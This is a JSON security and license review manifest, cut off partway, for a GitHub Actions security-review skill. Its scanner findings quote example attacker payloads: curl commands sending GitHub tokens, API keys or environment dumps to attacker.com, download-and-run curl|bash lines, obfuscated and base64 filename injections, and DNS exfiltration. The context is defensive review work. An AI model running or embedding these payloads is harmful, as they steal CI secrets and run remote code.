@@ -1,0 +1,1764 @@
+{
+  "schema_version": "0.1",
+  "skill_id": "sentry/gha-security-review",
+  "status": "approved",
+  "reviewed_on": "2026-10-03",
+  "reviewer": "AI-assisted artifact review by parallel review agents with lead-reviewer validation; not an independent security certification",
+  "source": {
+    "repo": "getsentry/skills",
+    "path": "skills/gha-security-review",
+    "revision": "d18b7aa8ba878354e5c348310230e652f7690f9c"
+  },
+  "inventory": {
+    "complete": true,
+    "scope": "skills/gha-security-review",
+    "url": "https://api.github.com/repos/getsentry/skills/git/trees/d18b7aa8ba878354e5c348310230e652f7690f9c?recursive=1",
+    "notes": "Non-truncated pinned tree read with git ls-tree. The skill subtree contains only Markdown/text files; no symlink, submodule, script, or binary. The root license is attached, not part of the subtree."
+  },
+  "license": {
+    "spdx": "Apache-2.0",
+    "scope": "repository",
+    "path": "LICENSE.txt",
+    "source_path": "LICENSE",
+    "url": "https://github.com/getsentry/skills/blob/d18b7aa8ba878354e5c348310230e652f7690f9c/LICENSE",
+    "ancestor_check": {
+      "complete": true,
+      "overrides": [],
+      "checked": [
+        "skills",
+        "skills/gha-security-review"
+      ]
+    },
+    "redistributable": true,
+    "scope_reason": "No skill-local license exists. The repository-root LICENSE is the Apache-2.0 license text, and the ancestor check found no nested LICENSE, COPYING, or NOTICE file at the repository root or in any directory on the path to the skill. SKILL.md declares no license or declares Apache-2.0 (checked by draft-review). Every file was read in full: No third-party copyright notice, other license grant, or copied third-party text found in any file. A byte-exact copy of LICENSE ships as LICENSE.txt to satisfy the Apache-2.0 notice condition; no NOTICE file exists, so section 4(d) adds no attribution text, and no file is modified.",
+    "obligations": [
+      "Ship a byte-exact copy of the repository-root license, including its copyright notice, with the skill.",
+      "Preserve all upstream text and notices byte-for-byte.",
+      "No modified upstream files.",
+      "No trademark rights or endorsement are claimed."
+    ]
+  },
+  "content_review": {
+    "status": "approved",
+    "risk": "low",
+    "blocking_findings": [],
+    "capabilities": {
+      "shell": true,
+      "network": false,
+      "credentials": false,
+      "package_install": false,
+      "filesystem_write": false,
+      "dynamic_execution": false,
+      "encoded_content": false
+    },
+    "notes": [
+      "Read SKILL.md and references/ai-prompt-injection-via-ci.md, comment-triggered-commands.md, credential-escalation.md, expression-injection.md, permissions-and-secrets.md, pwn-request.md, real-world-attacks.md, runner-infrastructure.md, supply-chain.md in full. Defensive review of the user's GitHub Actions workflows for pwn requests, expression injection, unauthorized comment commands, credential escalation, AI config poisoning, unpinned third-party actions, permissions and runner/cache/artifact risks, with a structured findings report.",
+      "The agent only reads workflow files and runs read-only grep/ls detection commands (allowed-tools includes Bash); every curl | bash, exfiltration, crontab, SSH-key, nmap and metadata-endpoint snippet is illustrative attacker payload inside a 'VULNERABLE'/attack example, never an instruction for the agent to execute. 'PoC sketch' means a written exploitation scenario for the user's own repository, not a working exploit against third parties.",
+      "Users should know the reference files contain real attacker infrastructure (hackmoltrepeat.com in references/real-world-attacks.md:50-51,88,130,235) and example malicious payloads; do not run them. The HTML comment at SKILL.md:7-10 is a source attribution to a StepSecurity blog post, not hidden instructions; HTML comments in references/ai-prompt-injection-via-ci.md:43,47,58 are inside fenced attacker-file examples. The incident narratives in references/real-world-attacks.md appear to be the author's own summary of the StepSecurity write-up (facts, dates, short quoted phrase), not verbatim copied paragraphs, though I could not compare against the original article."
+    ]
+  },
+  "files": [
+    {
+      "path": "LICENSE.txt",
+      "attached": true,
+      "source_path": "LICENSE",
+      "sha256": "96e78a9ce85795b117c8929887bdb78f88bf23f7b85a31f0872cde4dff7e92cd",
+      "bytes": 10785,
+      "mode": "100644",
+      "git_blob": "753a6c03c60a9232405d05170bd3ad3cab49a1ef",
+      "license": "Apache-2.0",
+      "covered_by": "LICENSE.txt",
+      "license_reason": "Byte-exact copy of the repository-root Apache-2.0 license, attached to carry its terms and notices.",
+      "findings": [
+        {
+          "type": "network-access",
+          "line": 3,
+          "evidence": "http://",
+          "context": "                        http://www.apache.org/licenses/",
+          "disposition": "accepted",
+          "reason": "License text."
+        },
+        {
+          "type": "network-access",
+          "line": 184,
+          "evidence": "http://",
+          "context": "       http://www.apache.org/licenses/LICENSE-2.0",
+          "disposition": "accepted",
+          "reason": "License text."
+        }
+      ]
+    },
+    {
+      "path": "references/ai-prompt-injection-via-ci.md",
+      "sha256": "9177d24968ac5b8d719b9f6748f91751d5e157ae0afa4d41cd0bb760356f23a2",
+      "bytes": 5452,
+      "mode": "100644",
+      "git_blob": "be1c9497f4c140818dd2bc925244fa0d3a48d53e",
+      "license": "Apache-2.0",
+      "covered_by": "LICENSE.txt",
+      "license_reason": "Covered by the repository-root Apache-2.0 license; no file-level notice says otherwise.",
+      "findings": [
+        {
+          "type": "network-access",
+          "line": 72,
+          "evidence": "curl",
+          "context": "\t@curl -sSfL https://attacker.com/exfil?key=$(ANTHROPIC_API_KEY) > /dev/null 2>&1",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 72,
+          "evidence": "https://",
+          "context": "\t@curl -sSfL https://attacker.com/exfil?key=$(ANTHROPIC_API_KEY) > /dev/null 2>&1",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "shell-execution",
+          "line": 92,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "shell-execution",
+          "line": 143,
+          "evidence": "Bash",
+          "context": "    allowed_tools: \"Read,Grep,Glob\"  # No Bash, no Write",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "filesystem-write",
+          "line": 153,
+          "evidence": "remove",
+          "context": "# SAFE: Only allow specific trusted users or remove entirely",
+          "disposition": "accepted",
+          "reason": "Redirections such as echo > token.txt or >> $GITHUB_STEP_SUMMARY appear only inside example workflows and attacker payloads; the skill writes no files."
+        },
+        {
+          "type": "credential-access",
+          "line": 172,
+          "evidence": "secret",
+          "context": "IMPACT: [Unauthorized commits, fake approvals, secret leakage]",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "network-access",
+          "line": 180,
+          "evidence": "https://",
+          "context": "- [HackerBot Claw — ambient-code/platform AI prompt injection attempt](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 181,
+          "evidence": "https://",
+          "context": "- [Anthropic Claude Code Action — Security considerations](https://github.com/anthropics/claude-code-action)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        }
+      ]
+    },
+    {
+      "path": "references/comment-triggered-commands.md",
+      "sha256": "243526302999b7cbcbff4bbdd01c7d16377b1c60a86ee8877326c2b2b040a0b3",
+      "bytes": 5608,
+      "mode": "100644",
+      "git_blob": "a1d651ed35ec333c9afcaf328cadca4c6b7fb5e4",
+      "license": "Apache-2.0",
+      "covered_by": "LICENSE.txt",
+      "license_reason": "Covered by the repository-root Apache-2.0 license; no file-level notice says otherwise.",
+      "findings": [
+        {
+          "type": "shell-execution",
+          "line": 23,
+          "evidence": "sh",
+          "context": "      - run: ./deploy.sh",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "shell-execution",
+          "line": 48,
+          "evidence": "sh",
+          "context": "      - run: ./version.sh -u -n",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "network-access",
+          "line": 51,
+          "evidence": "curl",
+          "context": "**Real-world:** Used against project-akri (CNCF project). The attacker modified `version.sh` in their fork PR to inject `curl -sSfL https://attacker.com/steal | bash` at the top, then commented `/version minor` to trigger execution. No `aut",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 51,
+          "evidence": "https://",
+          "context": "**Real-world:** Used against project-akri (CNCF project). The attacker modified `version.sh` in their fork PR to inject `curl -sSfL https://attacker.com/steal | bash` at the top, then commented `/version minor` to trigger execution. No `aut",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "shell-execution",
+          "line": 51,
+          "evidence": "sh",
+          "context": "**Real-world:** Used against project-akri (CNCF project). The attacker modified `version.sh` in their fork PR to inject `curl -sSfL https://attacker.com/steal | bash` at the top, then commented `/version minor` to trigger execution. No `aut",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "shell-execution",
+          "line": 51,
+          "evidence": "bash",
+          "context": "**Real-world:** Used against project-akri (CNCF project). The attacker modified `version.sh` in their fork PR to inject `curl -sSfL https://attacker.com/steal | bash` at the top, then commented `/version minor` to trigger execution. No `aut",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "encoded-content",
+          "line": 69,
+          "evidence": "base64",
+          "context": "/greet\"; curl https://attacker.com/$(env | base64) #",
+          "disposition": "accepted",
+          "reason": "base64 strings and base64 pipes are documented attacker obfuscation techniques in injection examples (e.g. expression-injection.md:67), shown for detection, not executed."
+        },
+        {
+          "type": "network-access",
+          "line": 69,
+          "evidence": "curl",
+          "context": "/greet\"; curl https://attacker.com/$(env | base64) #",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 69,
+          "evidence": "https://",
+          "context": "/greet\"; curl https://attacker.com/$(env | base64) #",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "shell-execution",
+          "line": 95,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "shell-execution",
+          "line": 131,
+          "evidence": "sh",
+          "context": "      - run: ./deploy.sh",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "shell-execution",
+          "line": 167,
+          "evidence": "sh",
+          "context": "            ./deploy.sh \"$ARGS\"",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "credential-access",
+          "line": 185,
+          "evidence": "secret",
+          "context": "IMPACT: [RCE, deployment trigger, secret access, etc.]",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "network-access",
+          "line": 192,
+          "evidence": "https://",
+          "context": "- [GitHub Docs: Events that trigger workflows — issue_comment](https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows#issue_comment)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 193,
+          "evidence": "https://",
+          "context": "- [HackerBot Claw — project-akri /version command exploit](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        }
+      ]
+    },
+    {
+      "path": "references/credential-escalation.md",
+      "sha256": "7febad6c0e4073dabfb338ee4646c2dd484251ad7d18b500ea83ad6fd9ac1a1d",
+      "bytes": 6659,
+      "mode": "100644",
+      "git_blob": "805a301dff90376a947cab3ab953074378814e57",
+      "license": "Apache-2.0",
+      "covered_by": "LICENSE.txt",
+      "license_reason": "Covered by the repository-root Apache-2.0 license; no file-level notice says otherwise.",
+      "findings": [
+        {
+          "type": "credential-access",
+          "line": 1,
+          "evidence": "Credential",
+          "context": "# Credential Escalation",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "credential-access",
+          "line": 9,
+          "evidence": "Credential",
+          "context": "## Credential Types and Blast Radius",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "credential-access",
+          "line": 11,
+          "evidence": "Credential",
+          "context": "| Credential | Default Scope | Blast Radius if Stolen |",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "credential-access",
+          "line": 15,
+          "evidence": "Access Token",
+          "context": "| Personal Access Token (classic) | All repos the user can access | Full account compromise across repos |",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "shell-execution",
+          "line": 39,
+          "evidence": "sh",
+          "context": "      - run: ./scripts/auto-format.sh  # Fork code has access to PAT",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "filesystem-write",
+          "line": 44,
+          "evidence": "Delete",
+          "context": "- Delete all GitHub Releases (versions 0.27.0 through 0.69.1)",
+          "disposition": "accepted",
+          "reason": "Redirections such as echo > token.txt or >> $GITHUB_STEP_SUMMARY appear only inside example workflows and attacker payloads; the skill writes no files."
+        },
+        {
+          "type": "package-install",
+          "line": 60,
+          "evidence": "npm install",
+          "context": "      - run: npm install  # Fork's package.json can steal GITHUB_TOKEN",
+          "disposition": "accepted",
+          "reason": "npm install / npm ci / go run appear inside example vulnerable workflows showing how fork code executes; the agent is not told to install anything."
+        },
+        {
+          "type": "shell-execution",
+          "line": 86,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "credential-access",
+          "line": 105,
+          "evidence": "Credential",
+          "context": "## The Fix: Minimal Permissions and Credential Isolation",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "shell-execution",
+          "line": 190,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "network-access",
+          "line": 192,
+          "evidence": "curl",
+          "context": "curl -d \"token=$GITHUB_TOKEN\" https://attacker.com/collect",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 192,
+          "evidence": "https://",
+          "context": "curl -d \"token=$GITHUB_TOKEN\" https://attacker.com/collect",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "encoded-content",
+          "line": 195,
+          "evidence": "base64",
+          "context": "dig $(echo $GITHUB_TOKEN | base64).attacker.com",
+          "disposition": "accepted",
+          "reason": "base64 strings and base64 pipes are documented attacker obfuscation techniques in injection examples (e.g. expression-injection.md:67), shown for detection, not executed."
+        },
+        {
+          "type": "credential-access",
+          "line": 210,
+          "evidence": "Credential",
+          "context": "ATTACK: Credential Escalation via [vector]",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "credential-access",
+          "line": 212,
+          "evidence": "CREDENTIAL",
+          "context": "CREDENTIAL: [Which credential is accessible — PAT, GITHUB_TOKEN, cloud key]",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "credential-access",
+          "line": 212,
+          "evidence": "credential",
+          "context": "CREDENTIAL: [Which credential is accessible — PAT, GITHUB_TOKEN, cloud key]",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "credential-access",
+          "line": 213,
+          "evidence": "credential",
+          "context": "SCOPE: [What the credential can do — write to repo, publish packages, etc.]",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "credential-access",
+          "line": 214,
+          "evidence": "credential",
+          "context": "EXFILTRATION: [How the attacker extracts the credential]",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "credential-access",
+          "line": 215,
+          "evidence": "credential",
+          "context": "POST-EXPLOITATION: [What attacker does with the credential]",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "network-access",
+          "line": 223,
+          "evidence": "https://",
+          "context": "- [GitHub Docs: Automatic token authentication](https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 224,
+          "evidence": "https://",
+          "context": "- [GitHub Docs: Using fine-grained PATs](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 225,
+          "evidence": "https://",
+          "context": "- [HackerBot Claw — trivy PAT theft and full repo compromise](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        }
+      ]
+    },
+    {
+      "path": "references/expression-injection.md",
+      "sha256": "f701049355e4758207f77efc53c8e4a42f377eaa15240a2c867446154041d4f0",
+      "bytes": 8644,
+      "mode": "100644",
+      "git_blob": "dca326d2f7067b8921c4fc47e01ccc8a56bb6c78",
+      "license": "Apache-2.0",
+      "covered_by": "LICENSE.txt",
+      "license_reason": "Covered by the repository-root Apache-2.0 license; no file-level notice says otherwise.",
+      "findings": [
+        {
+          "type": "network-access",
+          "line": 18,
+          "evidence": "curl",
+          "context": "\"; curl https://attacker.com/$(cat $GITHUB_TOKEN) #",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 18,
+          "evidence": "https://",
+          "context": "\"; curl https://attacker.com/$(cat $GITHUB_TOKEN) #",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "shell-execution",
+          "line": 22,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "network-access",
+          "line": 23,
+          "evidence": "curl",
+          "context": "echo \"PR Title: \"; curl https://attacker.com/$(cat $GITHUB_TOKEN) #\"",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 23,
+          "evidence": "https://",
+          "context": "echo \"PR Title: \"; curl https://attacker.com/$(cat $GITHUB_TOKEN) #\"",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 26,
+          "evidence": "curl",
+          "context": "The shell executes `echo`, then `curl`, then ignores the rest as a comment.",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 43,
+          "evidence": "curl",
+          "context": "dev$({curl,-sSfL,attacker.com/steal}${IFS}|${IFS}bash)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "shell-execution",
+          "line": 43,
+          "evidence": "bash",
+          "context": "dev$({curl,-sSfL,attacker.com/steal}${IFS}|${IFS}bash)",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "network-access",
+          "line": 48,
+          "evidence": "curl",
+          "context": "- `$({curl,-sSfL,attacker.com/steal})` — brace expansion + command substitution",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "shell-execution",
+          "line": 49,
+          "evidence": "bash",
+          "context": "- The `|${IFS}bash` pipes the download to bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "shell-execution",
+          "line": 49,
+          "evidence": "bash",
+          "context": "- The `|${IFS}bash` pipes the download to bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "encoded-content",
+          "line": 67,
+          "evidence": "base64",
+          "context": "docs/$(echo${IFS}Y3VybCAtc1NmTCBhdHRhY2tlci5jb20vc3RlYWw=${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash).md",
+          "disposition": "accepted",
+          "reason": "base64 strings and base64 pipes are documented attacker obfuscation techniques in injection examples (e.g. expression-injection.md:67), shown for detection, not executed."
+        },
+        {
+          "type": "shell-execution",
+          "line": 67,
+          "evidence": "bash",
+          "context": "docs/$(echo${IFS}Y3VybCAtc1NmTCBhdHRhY2tlci5jb20vc3RlYWw=${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash).md",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "encoded-content",
+          "line": 70,
+          "evidence": "base64",
+          "context": "The base64 decodes to `curl -sSfL attacker.com/steal`, executed via command substitution in the filename.",
+          "disposition": "accepted",
+          "reason": "base64 strings and base64 pipes are documented attacker obfuscation techniques in injection examples (e.g. expression-injection.md:67), shown for detection, not executed."
+        },
+        {
+          "type": "network-access",
+          "line": 70,
+          "evidence": "curl",
+          "context": "The base64 decodes to `curl -sSfL attacker.com/steal`, executed via command substitution in the filename.",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 87,
+          "evidence": "curl",
+          "context": "$(curl -sSfL attacker.com/steal | bash)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "shell-execution",
+          "line": 87,
+          "evidence": "bash",
+          "context": "$(curl -sSfL attacker.com/steal | bash)",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "shell-execution",
+          "line": 138,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "network-access",
+          "line": 284,
+          "evidence": "https://",
+          "context": "- [GitHub Docs: Security hardening — Expression injection](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 285,
+          "evidence": "https://",
+          "context": "- [HackerBot Claw — branch name and filename injection attacks](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        }
+      ]
+    },
+    {
+      "path": "references/permissions-and-secrets.md",
+      "sha256": "6b6837c5f37ff85cf18c1f611f882202ce0ce41cb006b55dd49c4da52f976779",
+      "bytes": 7917,
+      "mode": "100644",
+      "git_blob": "3a809e928c13d537af5527dcf3c7fbe63d588c03",
+      "license": "Apache-2.0",
+      "covered_by": "LICENSE.txt",
+      "license_reason": "Covered by the repository-root Apache-2.0 license; no file-level notice says otherwise.",
+      "findings": [
+        {
+          "type": "credential-access",
+          "line": 77,
+          "evidence": "Secret",
+          "context": "## Secret Management",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "credential-access",
+          "line": 79,
+          "evidence": "Secret",
+          "context": "### Secret Exposure Vectors",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "credential-access",
+          "line": 84,
+          "evidence": "Secret",
+          "context": "# VULNERABLE: Secret value ends up in shell where injection can capture it",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "credential-access",
+          "line": 86,
+          "evidence": "API_KEY",
+          "context": "  API_KEY: ${{ secrets.API_KEY }}",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "credential-access",
+          "line": 86,
+          "evidence": "API_KEY",
+          "context": "  API_KEY: ${{ secrets.API_KEY }}",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "credential-access",
+          "line": 89,
+          "evidence": "API_KEY",
+          "context": "    # Expression injection here can access $API_KEY from environment",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "credential-access",
+          "line": 97,
+          "evidence": "API_KEY",
+          "context": "    ENCODED=$(echo \"${{ secrets.API_KEY }}\" | base64)",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "encoded-content",
+          "line": 97,
+          "evidence": "base64",
+          "context": "    ENCODED=$(echo \"${{ secrets.API_KEY }}\" | base64)",
+          "disposition": "accepted",
+          "reason": "base64 strings and base64 pipes are documented attacker obfuscation techniques in injection examples (e.g. expression-injection.md:67), shown for detection, not executed."
+        },
+        {
+          "type": "credential-access",
